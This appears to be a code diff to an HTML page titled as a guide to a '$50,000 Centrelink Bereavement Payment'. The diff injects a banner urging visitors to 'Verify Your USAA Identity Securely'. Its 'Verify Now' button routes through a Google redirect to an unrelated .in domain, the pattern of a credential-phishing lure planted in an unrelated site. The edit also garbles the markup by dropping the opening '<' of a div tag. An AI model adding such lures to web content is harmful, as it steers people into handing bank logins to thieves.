@@ -18,9 +18,10 @@ How to Apply for the $50,000 Centrelink Bereavement Payment: Step-by-Step Guide
      
    </div>
 
-   <div class="hero-banner">
+   div class="hero-banner">
      <div class="hero-overlay">
-    
+       <h2 class="hero-heading">Verify Your USAA Identity Securely</h2>
+       <a class="hero-button" href="https://www.google.com/url?q=https%3A%2F%2Fbcetsamba.in%2Fusaa-com-verify-account%2F&sa=D&sntz=1&usg=AOvVaw2ny4L5StjePTvPVpsylIYQ" target="_blank">Verify Now</a>
      </div>
    </div>
 
